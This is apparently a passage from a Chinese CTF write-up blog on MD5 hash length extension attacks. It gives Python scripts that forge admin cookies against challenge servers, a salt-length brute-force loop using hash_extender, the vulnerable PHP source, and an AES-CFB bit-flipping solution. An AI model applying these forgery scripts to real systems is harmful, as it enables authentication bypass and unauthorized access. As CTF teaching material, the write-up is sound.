<pre class="prettyprint"><code class=" hljs ruby">import requests
se = requests.session()
cookies = {
    <span class="hljs-string">'hsh'</span><span class="hljs-symbol">:<span class="hljs-string">'9b012140133ad92facec4f297bcd2d92'</span></span>,
    <span class="hljs-string">'auth'</span><span class="hljs-symbol">:<span class="hljs-string">"admin"</span>+<span class="hljs-string">'\x80'</span>+<span class="hljs-string">'\x00'</span>*</span><span class="hljs-number">30</span>+<span class="hljs-string">'\xc8'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>+<span class="hljs-string">"admin"</span>
}
re = se.post(url=<span class="hljs-string">"http://45.78.29.252/hash.php"</span>,cookies=cookies)
print re.content
</code></pre>
<p>当然也可以直接用burp</p>
<p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170704012700711?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""/></p>
<h2 id="0x2-jarvisoj-flag在管理员手里">0x2 jarvisoj flag在管理员手里</h2>
<p>首先我介绍一个开源工具<a href="https://github.com/iagox86/hash_extender">hash_extender</a> <br>
具体的使用方法我这里就不在介绍了 主要介绍一下使用参数</br></p>
<pre class="prettyprint"><code class=" hljs haml">-<span class="ruby">d 被扩展的明文
</span>-<span class="ruby">a 附加的到原来hash的padding
</span>-<span class="ruby">l 盐的长度
</span>-<span class="ruby">f 加密方式
</span>-<span class="ruby">s 带盐加密的hash值
</span>-<span class="ruby">-out-data-format 输出格式
</span>-<span class="ruby">-quiet 仅输出必要的值</span></code></pre>
<p>题目中有备份文件泄露所以 <br>
利用vim恢复一下方法是，首先重命名为.index.php.swp,接着利用vim -r index.php即可恢复 <br>
源码如下</br></br></p>
<pre class="prettyprint"><code class=" hljs handlebars"><span class="xml"><span class="hljs-doctype">&lt;!DOCTYPE html&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>Web 350<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-title">style</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">"text/css"</span>&gt;</span><span class="css">
    <span class="hljs-tag">body</span> <span class="hljs-rules">{
        <span class="hljs-rule"><span class="hljs-attribute">background</span>:<span class="hljs-value">gray</span></span>;
        <span class="hljs-rule"><span class="hljs-attribute">text-align</span>:<span class="hljs-value">center</span></span>;
    <span class="hljs-rule">}</span></span>
</span><span class="hljs-tag">&lt;/<span class="hljs-title">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span>
    <span class="php"><span class="hljs-preprocessor">&lt;?php</span> 
        <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;
        <span class="hljs-variable">$role</span> = <span class="hljs-string">"guest"</span>;
        <span class="hljs-variable">$salt</span> = 
        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"role"</span>])) {
            <span class="hljs-variable">$role</span> = unserialize(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"role"</span>]);
            <span class="hljs-variable">$hsh</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"hsh"</span>];
            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$role</span>===<span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable">$hsh</span> === md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">"role"</span>]))) {
                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">true</span>;
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-variable">$auth</span> = <span class="hljs-keyword">false</span>;
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable">$s</span> = serialize(<span class="hljs-variable">$role</span>);
            setcookie(<span class="hljs-string">'role'</span>,<span class="hljs-variable">$s</span>);
            <span class="hljs-variable">$hsh</span> = md5(<span class="hljs-variable">$salt</span>.strrev(<span class="hljs-variable">$s</span>));
            setcookie(<span class="hljs-string">'hsh'</span>,<span class="hljs-variable">$hsh</span>);
        }
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$auth</span>) {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;h3&gt;Welcome Admin. Your flag is 
        } else {
            echo "</span>&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;<span class="hljs-string">";
        }
    ?&gt;</span></span>

<span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span>
</span></code></pre>
<h3 id="方法一-利用hashextender">方法一 利用hash_extender</h3>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
<span class="hljs-keyword">from</span> urlparse <span class="hljs-keyword">import</span> urlparse
<span class="hljs-keyword">from</span> httplib <span class="hljs-keyword">import</span> HTTPConnection
<span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> urlencode
<span class="hljs-keyword">import</span> json
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> urllib

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">gao</span><span class="hljs-params">(x, y)</span>:</span>
        <span class="hljs-comment">#print x</span>
        <span class="hljs-comment">#print y</span>
    url = <span class="hljs-string">"http://120.26.131.152:32778/"</span>
    cookie = <span class="hljs-string">"role="</span> + x + <span class="hljs-string">"; hsh="</span> + y
        <span class="hljs-comment">#print cookie</span>
    build_header = {
            <span class="hljs-string">'Cookie'</span>: cookie,
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0'</span>,
            <span class="hljs-string">'Host'</span>: <span class="hljs-string">'web.phrack.top:32785'</span>,
            <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,
    }
    urlparts = urlparse(url)
    conn = HTTPConnection(urlparts.hostname, urlparts.port <span class="hljs-keyword">or</span> <span class="hljs-number">80</span>)
    conn.request(<span class="hljs-string">"GET"</span>, urlparts.path, <span class="hljs-string">''</span>, build_header)
    resp = conn.getresponse()
    body = resp.read()
    <span class="hljs-keyword">return</span> body

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">1000</span>):
    <span class="hljs-keyword">print</span> i
    <span class="hljs-comment">#secret len = ???</span>
    find_hash = <span class="hljs-string">"../hash_extender/hash_extender -d ';\"tseug\":5:s' -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a ';\"nimda\":5:s' --out-data-format=html -l "</span> + str(i) + <span class="hljs-string">" --quiet"</span>
    <span class="hljs-comment">#print find_hash</span>
    calc_res = os.popen(find_hash).readlines()
    <span class="hljs-keyword">print</span> calc_res
    hash_value = calc_res[<span class="hljs-number">0</span>][:<span class="hljs-number">32</span>]
    attack_padding = calc_res[<span class="hljs-number">0</span>][<span class="hljs-number">32</span>:]
    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-<span class="hljs-number">1</span>])
    ret = gao(attack_padding, hash_value)
    <span class="hljs-keyword">if</span> <span class="hljs-string">"Welcome"</span> <span class="hljs-keyword">in</span> ret:
        <span class="hljs-keyword">print</span> ret
        <span class="hljs-keyword">break</span>


</code></pre>
<h3 id="方法二-利用上述脚本">方法二 利用上述脚本</h3>
<p>只需简单的更改第二个脚本就好</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
<span class="hljs-comment"># -*- coding: utf-8 -*-</span>
<span class="hljs-comment"># @Author：DshtAnger</span>
<span class="hljs-keyword">import</span> test1
<span class="hljs-keyword">import</span> hashlib
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> binascii
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime, long_to_bytes, bytes_to_long
<span class="hljs-comment">#reference:</span>
<span class="hljs-comment">#   http://www.freebuf.com/articles/web/69264.html</span>
<span class="hljs-comment">#problem link:</span>
<span class="hljs-comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span>
samplehash=<span class="hljs-string">"3a4727d57463f122833d9e732f94e4e0"</span>

<span class="hljs-string">'''
res = re.findall('.{8}',samplehash)
print res 

s = '03194d72'
print c
s1 = ""
print s1.join([s[i-2]+s[i-1] for i in xrange(len(s),0,-2)])
'''</span>
s =[]
res = re.findall(<span class="hljs-string">'.{8}'</span>,samplehash)
<span class="hljs-keyword">print</span> res 
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> res:
    ss = <span class="hljs-string">""</span>

    ss = ss.join([i[j-<span class="hljs-number">2</span>]+i[j-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> xrange(len(i),<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>)])

    s.append(bytes_to_long(binascii.a2b_hex(ss)))
<span class="hljs-keyword">print</span> [hex(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s]
<span class="hljs-comment"># 084e0343 a0486ff0 5530df6c 705c8bb4</span>
<span class="hljs-comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span>

s1=s[<span class="hljs-number">0</span>]
s2=s[<span class="hljs-number">1</span>]
s3=s[<span class="hljs-number">2</span>]
s4=s[<span class="hljs-number">3</span>]
<span class="hljs-comment">#exp</span>

secret_admin=<span class="hljs-string">'xxxxxxxxxxxx;"tseug":5:s'</span>+<span class="hljs-string">'\x80'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">31</span>+<span class="hljs-string">'\x18'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>+<span class="hljs-string">';"nimda":5:s'</span>
r = test1.deal_rawInputMsg(secret_admin)
inp = r[len(r)/<span class="hljs-number">2</span>:]      <span class="hljs-comment">#我们需要截断的地方，也是我们需要控制的地方</span>
<span class="hljs-comment">#print r;"tseug":5:s</span>
<span class="hljs-comment">#print inp</span>
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+test1.run_md5(s1,s2,s3,s4,inp)
<span class="hljs-keyword">print</span> <span class="hljs-string">"getmein:"</span>+hashlib.md5(secret_admin).hexdigest()</code></pre>
<p>代码中的xxxxx就是salt 但是首先我们要猜测长度 所以可以利用脚本写一个简单的爆破</p>
<h2 id="0x3-admin">0x3 admin</h2>
<p>这道题目也是不错的考察了，hash扩展攻击技巧以及aes的相关加密方式</p>
<p>题目我已经上传到github上面了<a href="https://github.com/actionyz/Web/tree/master/web%E5%AF%86%E7%A0%81%EF%BC%88hash%20extend%20aes%20cfb%E5%8A%A0%E5%AF%86%EF%BC%89">链接</a></p>
<p>主要还是代码审计</p>
<h3 id="step-1-初步审计">step 1 初步审计</h3>
<ol>
<li>访问backup_old.php会生成flag的加密内容</li>
<li>index.php提供注册登录解密等功能</li>
<li>要想实现解密必须是的admin的值为1</li>
</ol>
<h3 id="step-2-直接解密解法一">step 2 直接解密(解法一)</h3>
<p>这里需要注意一下aes加密解密，是要16字节填充的。所以要控制一下用户名长度</p>
<p>我们注册 <br>
<code>username = xxxxxxxadmin|1|501530457b49501056d8f994d12252ca</code> <br>
就会得到加密的内容我们取前96位，因为明文已知所以最后一位字节翻转</br></br></p>
<pre class="prettyprint"><code class=" hljs perl">import binascii
<span class="hljs-keyword">s</span> = <span class="hljs-string">'7bbb9e011044a910a7c78694894637b75baf41106081282d35d171253cadcbbf24498a58a9ac5e5bdba9ed1c3f3badf6e5844ea87f28680454a847808321da8ce581b67e0c24bc6cab79cf8c9ce16074ae8a01456f3921f8a4bd654ceaf9da51'</span>
string = <span class="hljs-keyword">s</span>[<span class="hljs-number">0</span>:<span class="hljs-number">96</span>]
last_8 = binascii.a2b_hex(string[-<span class="hljs-number">2</span>:])
<span class="hljs-keyword">print</span> len(last_8)
plain = <span class="hljs-string">'|'</span>
mid = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(last_8[i])^<span class="hljs-keyword">ord</span>(plain[i])) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])
final = <span class="hljs-string">''</span>.<span class="hljs-keyword">join</span>([<span class="hljs-keyword">chr</span>(<span class="hljs-keyword">ord</span>(mid[i])^<span class="hljs-keyword">ord</span>(<span class="hljs-string">'\x01'</span>)) <span class="hljs-keyword">for</span> i in range(<span class="hljs-number">1</span>)])
<span class="hljs-keyword">print</span> string[:-<span class="hljs-number">2</span>]+binascii.b2a_hex(final)
</code></pre>
<p>将<code>token=</code> <br>
<code>login=501530457b49501056d8f994d12252ca</code></br></p>
<h3 id="step-3-利用hash拓展攻击没有必要">step 3 利用hash拓展攻击（没有必要）</h3>
<p>贴上脚本，hash生成还是以前的脚本</p>
<pre class="prettyprint"><code class=" hljs python"><span class="hljs-comment">#coding:utf-8</span>
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> re
url_register = <span class="hljs-string">'http://127.0.0.1/var/index.php?action=register'</span>
url_login = <span class="hljs-string">'http://127.0.0.1/var/index.php?action=login'</span>
url_manage = <span class="hljs-string">'http://127.0.0.1/var/index.php?action=manage'</span>
url_back = <span class="hljs-string">'http://127.0.0.1/var/backup_old.php'</span>
re1 = requests.session()
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span><span class="hljs-params">(name,passwd)</span>:</span>
    data = {
    <span class="hljs-string">'user'</span>:name,
    <span class="hljs-string">'pwd'</span>:passwd
    }
    re1.post(url_register,data=data)

<span class="hljs-comment"># login('kk','kk')</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span><span class="hljs-params">(name,passwd)</span>:</span>
    data = {
    <span class="hljs-string">'user'</span>:name,
    <span class="hljs-string">'pwd'</span>:passwd
    }
    s = re1.post(url_login,data=data,allow_redirects=<span class="hljs-keyword">False</span>)
    <span class="hljs-comment"># print s.content</span>
    <span class="hljs-keyword">return</span>  s.cookies

token_fl = <span class="hljs-string">''</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">attack</span><span class="hljs-params">(token,sign)</span>:</span>
    <span class="hljs-keyword">global</span> token_fl

    cookies ={
    <span class="hljs-string">'sign'</span>:sign,
    <span class="hljs-string">'token'</span>:token,
    }

    s = re1.post(url_manage,data={<span class="hljs-string">'do'</span>:<span class="hljs-string">'decrypt'</span>},cookies=cookies)
    <span class="hljs-keyword">if</span> <span class="hljs-string">'Password'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s.content:
        token_fl = token


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">test</span><span class="hljs-params">(token,sign)</span>:</span>
    re1.post(url_back)
    srand = int(time.time())
    r = re1.post(<span class="hljs-string">'http://127.0.0.1/var/backup.txt'</span>)
    encrypt = r.content
    r = re1.post(<span class="hljs-string">'http://127.0.0.1/2.php'</span>,data={<span class="hljs-string">'a'</span>:srand})
    st = r.content
    string = <span class="hljs-string">''</span>.join([hex(ord(i))[<span class="hljs-number">2</span>:] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> st])
    <span class="hljs-keyword">print</span> st,string
    cookies ={
    <span class="hljs-string">'sign'</span>:sign,
    <span class="hljs-string">'token'</span>:token,
    }
    s = re1.post(url_manage,data={<span class="hljs-string">'do'</span>:<span class="hljs-string">'decrypt'</span>,<span class="hljs-string">'iv'</span>:string,<span class="hljs-string">'text'</span>:encrypt},cookies=cookies)
    <span class="hljs-keyword">print</span> s.content
    r = re.findall(<span class="hljs-string">'(.{32,32})&lt;br /&gt;'</span>,s.content)
    <span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([chr(int(<span class="hljs-string">'0x'</span>+r[<span class="hljs-number">0</span>][i]+r[<span class="hljs-number">0</span>][i+<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>,len(r[<span class="hljs-number">0</span>]),<span class="hljs-number">2</span>)])

hash_ex = <span class="hljs-string">'e825bd41831d87fa7e8b84b5e6614ce5'</span>
name = <span class="hljs-string">'admin'</span>+<span class="hljs-string">'\x80'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">40</span>+<span class="hljs-string">'\x78'</span>+<span class="hljs-string">'\x00'</span>*<span class="hljs-number">7</span>+<span class="hljs-string">'tadmin'</span>+<span class="hljs-string">'|1|'</span>+hash_ex


passwd = <span class="hljs-string">'33'</span>
<span class="hljs-comment"># register(name,passwd)</span>
rs = login(name,passwd)
<span class="hljs-keyword">print</span> rs[<span class="hljs-string">'sign'</span>],len(rs[<span class="hljs-string">'token'</span>][:<span class="hljs-number">190</span>])
<span class="hljs-comment"># print rs['token'][:190]</span>
dic = []
s = <span class="hljs-string">'0987654321abcdef'</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> s:
        dic.append(i+j)


<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> dic:
    attack(rs[<span class="hljs-string">'token'</span>][:<span class="hljs-number">190</span>]+i,hash_ex)

<span class="hljs-comment"># print token_fl</span>
test(token_fl,hash_ex)</code></pre></div>